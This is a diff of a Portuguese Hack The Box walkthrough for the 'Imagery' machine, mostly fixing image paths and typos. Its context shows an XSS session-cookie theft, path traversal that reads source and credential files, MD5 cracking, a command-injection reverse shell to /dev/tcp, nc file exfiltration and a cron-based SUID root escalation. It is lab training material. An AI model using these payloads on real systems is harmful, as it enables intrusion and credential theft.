@@ -5,7 +5,7 @@ Máquina: Imagery
 Dificuldade: Média
 Plataforma: Hack The Box
 
-![](/images/image.png)
+![](images/image.png)
 
 # Reconhecimento
 
@@ -17,15 +17,15 @@ nmap -p- --min-rate 1600 -sVC -Pn --open 10.129.242.164
 
 Obtendo as portas:
 
-![](/images/Print01.png) 
+![](images/Print01.png) 
 
 Em seguida, acessamos a aplicação web e nos deparamos com uma aplicação de galeria online
 
-![](/images/Print02.png)
+![](images/Print02.png)
 
 # Enumeração
 
-Em seguida, decidimos por realizarmos um **fuzzing** de diretórios utilizando a ferramenta **ffuf**, para descobrirmos diretórios e arquivos ocultos.
+Em seguida, decidimos por realizarmos um **fuzzing** de diretórios utilizando a ferramenta **ffuf**, para descobrirmos diretórios e arquivos ocultos.
 
 ```shell
 ffuf -u http://10.129.242.164:8000/FUZZ -w SecLists/Discovery/Web-Content/big.txt -t 160
@@ -33,19 +33,19 @@ ffuf -u http://10.129.242.164:8000/FUZZ -w SecLists/Discovery/Web-Content/big.tx
 
 Obtendo os seguintes diretórios:
 
-![](/images/Print03.png)
+![](images/Print03.png)
 
 Ao navegarmos para o campo `Register` criamos uma conta e realizamos o `login` para obtermos acesso na aplicação sendo redirecionados para a sessão `Gallery`. 
 
-![](/images/Print04.png)
+![](images/Print04.png)
 
 Já no campo `Upload` vemos que a aplicação suporta vários tipo de arquivos de imagens 
 
-![](/images/Print05.png)
+![](images/Print05.png)
 
 Em seguida, fizermos o upload de uma imagem e ao clicarmos sobre os três pontos é visto que há várias opções de modificações desativadas havendo apenas as opções `Download` e `Delete` liberadas. 
 
-![](/images/Print06.png)
+![](images/Print06.png)
 
 # Exploração - Session Hijacking
 
@@ -63,7 +63,7 @@ Payload XSS:
 ```
 
 
-![](/images/Print07.png)
+![](images/Print07.png)
 
 Após um tempo, obtivermos o cookie de sessão no parâmetro `GET` com sucesso.
 
@@ -73,23 +73,23 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.242.164 - - [19/May/2026 22:02:25] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.ag0IEQ.-k0XqyUQVVoxB_JfzztPs2gyF9k HTTP/1.1" 404 -
 ```
 
-![](/images/Print08.png)
+![](images/Print08.png)
 
 Com esse cookie, utilizamos a ferramenta `DevTools` para alterar o cookie na aba `Storage` e atualizamos a página com isso obtemos acesso ao painel administrativo. 
 
-![](/images/Print09.png)
+![](images/Print09.png)
 
 Dentro do Painel é possível realizar o Download do logs do usuário `testuser@imagery.htb` em que é dado uma mensagem de erro.
 
-![](/images/Print10.png)
+![](images/Print10.png)
 
 Com essa mensagem de erro, é visto que há uma vulnerabilidade de `path traversal` em que nos possibilita ler arquivos no servidor a começar pelo arquivo `passwd`:
 
-![](/images/Print11.png)
+![](images/Print11.png)
 
 Em seguida, lemos o arquivo `proc/self/cmdline` em que retornou o caminho para o código-fonte da aplicação onde identificamos que se trata de um código `Python`
 
-![](/images/Print12.png)
+![](images/Print12.png)
 
 Com isso obtemos o `código-fonte` da aplicação através do caminho `/home/web/web/app.py`
 
@@ -145,7 +145,7 @@ if __name__ == '__main__':
     app_core.run(debug=False, host='0.0.0.0', port=port)
 ```
 
-![](/images/Print13.png)
+![](images/Print13.png)
 
 Como é mostrado no código acima é importado o `config.py` estando no mesmo diretório do código-fonte no qual podemos extraí-lo também.
 
@@ -203,7 +203,7 @@ IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
 EXIFTOOL_PATH = '/usr/bin/exiftool'
 ```
 
-![](/images/Print14.png)
+![](images/Print14.png)
 
 Após uma análise no código é visto que há a variável `DATA_STORE_PATH` com o valor  `db.json` no qual indica um caminho relativo para o banco de dados da aplicação em formato `JSON` que se encontra no mesmo diretório que os demais códigos, possibilitando extrai-lo via `path traversal`.
 
@@ -250,7 +250,7 @@ Após uma análise no código é visto que há a variável `DATA_STORE_PATH` com
 }
 ```
 
-![](/images/Print15.png)
+![](images/Print15.png)
 
 Neste arquivo `JSON` vemos que contém as credenciais dos usuários `admin@imagery.htb` e `testuser@imagery.htb`. Em que as senhas estão codificadas em hash `MD5` no que podemos decodificar via [CrackStation](https://crackstation.net/) assim obtendo a senha apenas do usuário `testuser`. 
 
@@ -259,7 +259,7 @@ Senha:
 iambatman
 ```
 
-![](/images/Print16.png)
+![](images/Print16.png)
 
 Voltando para as modificações de imagem que estão desativadas para o meu usuário, podemos analisar o código `api_edit` para sabermos o porque dessas opções estarem desativadas.
 
@@ -453,7 +453,7 @@ def delete_image_metadata():
         return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
 ```
 
-![](/images/Print17.png)
+![](images/Print17.png)
 
 No qual descobrirmos que as funcionalidades de modificações de imagem se atribuem apenas para o usuário `testuser`  por meio desse trecho de código:
 
@@ -482,9 +482,9 @@ Para explorarmos a vulnerabilidade de `Command Injection` primeiro devemos logar
 "password": "iambatman"
 ```
 
-Em seguida, realizamos o upload de uma imagem para que utilizamos o campo `Transform Image
+Em seguida, realizamos o upload de uma imagem para que utilizamos o campo `Transform Image`
 
-![](/images/Print18.png)
+![](images/Print18.png)
 
 Interceptando a requisição com o `Burp Suite` podemos injetar um `payload` de `reverse shell` para possamos adentrar ao servidor.
 
@@ -499,13 +499,13 @@ Payload:
 "|| bash -c 'sh -i >& /dev/tcp/10.10.14.161/4444 0>&1'||"
 ```
 
-![](/images/Print19.png)
+![](images/Print19.png)
 
 # Movimentação Lateral
 
 Com a `reverse shell` estabelecida, identificamos que estamos como usuário `web`, no qual não possui privilégios de sudo, sendo preciso enumerar o host em busca de algo que nos possa obter privilégios sudo.
 
-![](/images/Print20.png)
+![](images/Print20.png)
 
 Podemos usar comandos para melhora-la:
 
@@ -523,7 +523,7 @@ Após enumerar o sistema, encontramos dentro da pasta `/var/backup` um arquivo Z
 nc -w3 10.10.16.18 3333 < /var/backup/web_20250806_120723.zip.aes
 ```
 
-![](/images/Print21.png)
+![](images/Print21.png)
 
 Ao executar o arquivo, o programa é identificado como criador  `pyAesCrypt 6.1.1` porém é também mostrado que está encriptado por `AES` o que nos levou a usar a ferramenta  `dpyAesCrypt` para decriptar o arquivo, com os seguintes comandos:
 
@@ -535,7 +535,7 @@ git clone https://github.com/Nabeelcn25/dpyAesCrypt.py.git
 
 Obtendo a senha: `bestfriends`
 
-![](/images/Print22.png)
+![](images/Print22.png)
 
 Para extrair as informações desse arquivo utilizamos o comando `unzip`
 
@@ -545,11 +545,11 @@ unzip web_20250806_120723.zip -d extracted
 
 Em seguida navegamos até o diretório que continha o conteúdo do diretório `web` , vendo que também havia um arquivo `db.json` e que provavelmente poderia conter credenciais
 
-![](/images/Print23.png)
+![](images/Print23.png)
 
 Ao analisarmos o arquivo encontramos as credenciais dos usuários `mark@imagery.htb` e `web@imagery.htb`: 
 
-![](/images/Print24.png)
+![](images/Print24.png)
 
 Como as senhas estão codificadas em `MD5`, utilizamos novamente o [CrackStation](https://crackstation.net/)  para decifrar as hashes assim obtendo as senhas do usuários.
 
@@ -566,21 +566,21 @@ Como as senhas estão codificadas em `MD5`, utilizamos novamente o [CrackStation
 
 Em seguida, com a senha do usuário `mark@imagery.htb` conseguimos mudar de usuário e obter a `user flag` no arquivo `user.txt`:
 
-![](/images/Print25.png)
+![](images/Print25.png)
 
 # Escalação de Privilégio
 
 Utilizamos o comando `sudo -l` para verificar as permissões de execução de comandos do usuário `mark`, e identificamos que o executável `charcol` responsável por criar arquivos de `backups` criptografados.
 
-![](/images/Print26.png)
+![](images/Print26.png)
 
 Executando o `charcol` percebemos que há uma opção de o executarmos com uma `shell` interativa através do comando `charcol shell` .
 
-![](/images/Print27.png)
+![](images/Print27.png)
 
 Ao executar novamente o  `charcol` mas sem senha,  usamos o comando `help` para listar todos os comandos possíveis e um deles nos permite adicionar uma nova tarefa  `cron`  com o comando `auto add`. 
 
-![](/images/Print28.png)
+![](images/Print28.png)
 
 Com isso executamos uma tarefa `cron` no qual será executado a cada minuto, nos possibilitando de  obter `root`: 
 
@@ -588,9 +588,8 @@ Com isso executamos uma tarefa `cron` no qual será executado a cada minuto, nos
 auto add --schedule "* * * * *" --command "bash -c 'cp /bin/bash /home/mark/bash; chmod u+s /home/mark/bash'" --name escalate
 ```
 
-![](/images/Print29.png)
+![](images/Print29.png)
 
 Em seguida, Conseguimos a `root flag` contida no diretório `root` e arquivo `root.txt`
 
-![](/images/Print30.png)
-
+![](images/Print30.png)
